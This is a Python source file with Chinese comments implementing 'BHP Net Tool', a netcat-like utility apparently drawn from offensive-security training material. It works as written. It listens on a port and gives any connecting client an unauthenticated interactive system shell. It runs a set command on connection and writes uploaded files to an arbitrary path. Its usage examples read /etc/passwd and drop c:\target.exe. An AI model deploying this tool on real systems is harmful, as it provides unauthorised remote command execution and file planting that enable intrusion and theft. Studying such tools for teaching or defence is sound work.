import sys
import socket
import getopt
import threading
import subprocess
import platform

# 全局变量，用于存储配置参数
listen = False              # 是否启用服务器监听模式
command = False             # 是否启用交互式命令行模式
upload = False              # 是否启用文件上传功能
execute = ""                # 连接时执行的命令
target = ""                 # 目标主机 IP 或主机名
upload_destination = ""     # 上传文件的目标路径
port = 0                    # 连接或监听的端口号

# 显示使用说明
def usage():
    """
    打印 BHP Net Tool 的使用说明并退出程序。
    """
    print("BHP Net Tool")
    print()
    print("用法: bhpnet.py -t 目标主机 -p 端口")
    print("-l --listen              - 在 [主机]:[端口] 监听传入连接")
    print("-e --execute=文件路径    - 接收连接时执行指定文件")
    print("-c --command             - 初始化一个交互式命令行")
    print("-u --upload=目标路径     - 接收连接时上传文件并写入指定路径")
    print()
    print("示例: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    sys.exit(0)

# 主函数，解析参数并决定运行模式
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    global upload

    # 如果没有提供参数，显示使用说明
    if not len(sys.argv[1:]):
        usage()
    
    # 使用 getopt 解析命令行参数
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", 
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    # 处理解析的参数
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
            upload = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "未处理的参数"
    
    # 客户端模式：如果不监听且指定了目标和端口，发送数据
    if not listen and len(target) and port > 0:
        client_sender()
    
    # 服务器模式：如果监听，启动服务器循环
    if listen:
        server_loop()

# 客户端函数，向远程服务器发送数据
def client_sender():
    """
    连接到目标主机并发送/接收数据。
    """
    # 创建 TCP 套接字
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 连接到目标主机和端口
        client.connect((target, port))

        # 交互式接收和发送数据
        while True:
            recv_len = 1
            response = ""

            # 循环接收数据直到无数据
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode("utf-8", errors="ignore")

                # 如果接收数据小于 4096 字节，假设数据接收完成
                if recv_len < 4096:
                    break
        
            # 打印服务器响应
            print(response)

            # 等待用户输入
            buffer = input("")
            buffer += "\n"  # 添加换行符以标记命令结束

            # 发送用户输入
            client.send(buffer.encode())

    except Exception as e:
        print(f"[*] 异常！{e}")
        client.close()

# 服务器函数，监听传入连接
def server_loop():
    """
    设置 TCP 服务器，监听传入连接并为每个连接创建处理线程。
    """
    global target

    # 如果未指定目标，默认监听所有接口
    if not len(target):
        target = "0.0.0.0"

    # 创建并配置 TCP 套接字
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)  # 允许最多 5 个排队连接

    # 接受连接并为每个客户端创建处理线程
    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

# 执行系统命令并返回输出
def run_command(command):
    """
    运行系统命令并捕获其输出。
    参数:
        command (str): 要执行的命令。
    返回:
        bytes: 命令输出或错误信息。
    """
    command = command.rstrip()  # 移除命令末尾的空白字符

    try:
        shell_encoding = "gbk" if platform.system() == "Windows" else "utf-8"
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        output = output.decode(shell_encoding).encode("utf-8")
    except subprocess.CalledProcessError as e:
        output = e.output.decode(shell_encoding).encode("utf-8")
    except Exception:
        output = b"not command\r\n"

    return output

# 处理单个客户端连接
def client_handler(client_socket):
    """
    处理客户端连接，支持文件上传、命令执行或交互式命令行。
    参数:
        client_socket (socket): 客户端套接字对象。
    """
    global upload
    global execute
    global command

    # 处理文件上传
    if len(upload_destination):
        file_buffer = b""  # 用于存储接收的文件数据（必须为字节类型）

        # 持续接收数据直到连接关闭
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            file_buffer += data

        # 将接收的数据写入目标文件
        try:
            with open(upload_destination, "wb") as file_descriptor:
                file_descriptor.write(file_buffer)
            client_socket.send(f"成功将文件保存到 {upload_destination}\r\n".encode())
        except Exception:
            client_socket.send(f"无法将文件保存到 {upload_destination}\r\n".encode())

    # 处理命令执行
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    # 处理交互式命令行
    if command:
        while True:
            client_socket.send(b"BHP: #> ")  # 发送命令提示符

            # 接收命令直到收到换行符
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                data = client_socket.recv(1024).decode()
                if not data:  # 客户端断开连接
                    return
                cmd_buffer += data

            # 执行命令并发送结果
            response = run_command(cmd_buffer)
            client_socket.send(response)

if __name__ == "__main__":
    main()